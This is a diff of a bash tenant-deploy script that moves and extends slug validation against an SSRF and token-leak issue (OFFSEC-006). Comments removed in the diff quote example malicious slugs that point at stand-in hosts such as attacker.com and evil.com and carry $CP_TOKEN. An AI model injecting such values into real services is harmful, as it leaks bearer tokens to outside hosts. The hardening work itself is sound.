@@ -54,57 +54,6 @@
 #   64  argument/usage error
 
 set -euo pipefail
-# Disable glob expansion so tenant slugs containing *, ?, [ are treated as
-# literals, not filename patterns. This is the primary defence against the
-# token-exfiltration attack vector where a malicious slug like
-# "evil?url=https://attacker.com?token=$CP_TOKEN" could otherwise expand to
-# a list of filenames via pathname expansion.
-set -f
-
-# ─────────────────────────────────────────────────────────────────────────────
-# Slug validation (OFFSEC-006)
-# ─────────────────────────────────────────────────────────────────────────────
-#
-# Slugs are interpolated into URL paths (cp_redeploy_tenant, tenant_buildinfo,
-# tenant_health, resolve_tenant_instance_id) and ECR identifiers. An unsanitised
-# slug can trigger:
-#   1. SSRF   — slug=https://evil.com?x= injected as URL authority/path segment.
-#   2. Token exfiltration — slug=?url=https://evil.com&token=$CP_TOKEN causes
-#      curl to issue a GET to the attacker's host, leaking the bearer token.
-# The guard above (set -f) blocks glob metacharacter expansion; this function
-# validates the slug shape so malformed names are rejected before any network
-# call is issued.
-
-# Simple logging helpers — defined early so validate_slug can call err
-# before the full Steps block is reached. The real definitions (with full
-# timestamps) live in the Steps section and re-declare them idempotently.
-err() { printf '[%s] ERROR: %s\n' "$(date -u +%H:%M:%SZ)" "$*" >&2; }
-
-# Validates a single tenant slug against RFC-1123 + lowercase + max 63 chars.
-# arg1 = slug string
-# exits 64 if invalid; returns 0 on success.
-validate_slug() {
-  local slug="$1"
-  # RFC-1123 label: lowercase alphanumeric, single hyphens allowed between chars,
-  # no leading/trailing hyphen, 1–63 chars total. Also allows single-char slugs.
-  if [[ ! "$slug" =~ ^[a-z0-9]([a-z0-9-]{0,61}[a-z0-9])?$ ]]; then
-    err "invalid tenant slug: '$slug' (must match ^[a-z0-9]([a-z0-9-]{0,61}[a-z0-9])?$; got '${slug//$'\n'/<LF>}')"
-    return 1
-  fi
-  return 0
-}
-
-# Validates all tenant slugs from the --tenants argument.
-# Called once after argument parsing, before any network call.
-validate_tenants() {
-  local slug
-  IFS=',' read -ra SLUGS <<<"$TENANTS"
-  for slug in "${SLUGS[@]}"; do
-    [[ -z "$slug" ]] && { err "empty slug in --tenants list"; return 1; }
-    validate_slug "$slug" || return 1
-  done
-  return 0
-}
 
 # ─────────────────────────────────────────────────────────────────────────────
 # Argument parsing
@@ -151,9 +100,6 @@ done
   printf 'source-tag and dest-tag must differ\n' >&2
   exit 64
 }
-
-# Validate slugs before any network call (OFFSEC-006)
-validate_tenants || exit 64
 
 # Snapshot/rollback tag (deterministic — same script run on same UTC date
 # is idempotent; cross-day reruns get distinct rollback points).
@@ -233,6 +179,7 @@ cp_redeploy_tenant() {
   #   1  — any other failure
   # stdout = response body. stderr = "HTTP_STATUS=NNN" line.
   local slug="$1" tag="$2"
+  validate_slug "$slug"
   _mock_call cp_redeploy_tenant "$slug" "$tag"; local _mrc=$?
   [[ $_mrc -ne 99 ]] && return $_mrc
   local tok="${!CP_TOKEN_ENV:-}"
@@ -258,6 +205,7 @@ cp_redeploy_tenant() {
 tenant_buildinfo() {
   # args: <slug>; prints JSON
   local slug="$1"
+  validate_slug "$slug"
   _mock_call tenant_buildinfo "$slug"; local _mrc=$?
   [[ $_mrc -ne 99 ]] && return $_mrc
   curl -sf --max-time 10 "https://${slug}.moleculesai.app/buildinfo"
@@ -266,6 +214,7 @@ tenant_buildinfo() {
 tenant_health() {
   # args: <slug>; prints raw response, returns 0 if "ok"
   local slug="$1"
+  validate_slug "$slug"
   _mock_call tenant_health "$slug"; local _mrc=$?
   [[ $_mrc -ne 99 ]] && return $_mrc
   curl -sf --max-time 10 "https://${slug}.moleculesai.app/health"
@@ -310,6 +259,7 @@ print(json.dumps({'commands': [ecr_login]}))
 resolve_tenant_instance_id() {
   # args: <slug>; prints i-xxx
   local slug="$1"
+  validate_slug "$slug"
   _mock_call resolve_tenant_instance_id "$slug"; local _mrc=$?
   [[ $_mrc -ne 99 ]] && return $_mrc
   local tok="${!CP_TOKEN_ENV:-}"
@@ -324,6 +274,19 @@ resolve_tenant_instance_id() {
 
 log() { printf '[%s] %s\n' "$(date -u +%H:%M:%SZ)" "$*"; }
 err() { printf '[%s] ERROR: %s\n' "$(date -u +%H:%M:%SZ)" "$*" >&2; }
+
+# validate_slug — exit 64 if slug contains characters outside the safe set.
+# Prevents SSRF via query-separator injection (?foo) and subdomain takeover
+# (@evil) when slug is interpolated into URL paths or subdomains.
+# OFFSEC-006 fix.
+validate_slug() {
+  local slug="$1"
+  if ! [[ "$slug" =~ ^[a-z0-9]([a-z0-9-]{0,61}[a-z0-9])?$ ]]; then
+    printf '[%s] ERROR: invalid slug: %s\n' \
+      "$(date -u +%H:%M:%SZ)" "$slug" >&2
+    exit 64
+  fi
+}
 
 preflight() {
   log "preflight: source=$SOURCE_TAG dest=$DEST_TAG repo=$REPO region=$REGION"
@@ -393,6 +356,7 @@ promote() {
 redeploy_tenant() {
   # args: <slug> — handle the 403→SSM-refresh→retry pattern
   local slug="$1"
+  validate_slug "$slug"
   log "  redeploy: $slug"
   if [[ "$DRY_RUN" == "true" ]]; then
     log "    [dry-run] would POST /redeploy slug=$slug"
@@ -426,6 +390,7 @@ redeploy_tenant() {
 
 verify_tenant() {
   local slug="$1"
+  validate_slug "$slug"
   log "  verify: $slug"
   if [[ "$DRY_RUN" == "true" ]]; then
     log "    [dry-run] would curl /buildinfo + /health"
@@ -452,6 +417,7 @@ rollback() {
   rm -f "$mfile"
   IFS=',' read -ra slugs <<<"$TENANTS"
   for slug in "${slugs[@]}"; do
+    validate_slug "$slug"
     redeploy_tenant "$slug" || err "  rollback redeploy failed for $slug"
   done
   log "rollback: complete"
@@ -462,6 +428,13 @@ rollback() {
 # ─────────────────────────────────────────────────────────────────────────────
 
 main() {
+  # OFFSEC-006: validate slugs before any network I/O.
+  IFS=',' read -ra _slugs <<<"$TENANTS"
+  for _slug in "${_slugs[@]}"; do
+    validate_slug "$_slug"
+  done
+  unset _slugs _slug
+
   preflight || return 1
   snapshot_dest_tag || return 2
   promote || return 2
@@ -469,8 +442,15 @@ main() {
   local promote_rc=0
   IFS=',' read -ra slugs <<<"$TENANTS"
   for slug in "${slugs[@]}"; do
-    redeploy_tenant "$slug" || promote_rc=1
-    [[ $promote_rc -eq 0 ]] && { verify_tenant "$slug" || promote_rc=1; }
+    validate_slug "$slug"
+    if ! redeploy_tenant "$slug"; then
+      promote_rc=1
+    fi
+    if [[ $promote_rc -eq 0 ]]; then
+      if ! verify_tenant "$slug"; then
+        promote_rc=1
+      fi
+    fi
     [[ $promote_rc -ne 0 ]] && break
   done
 
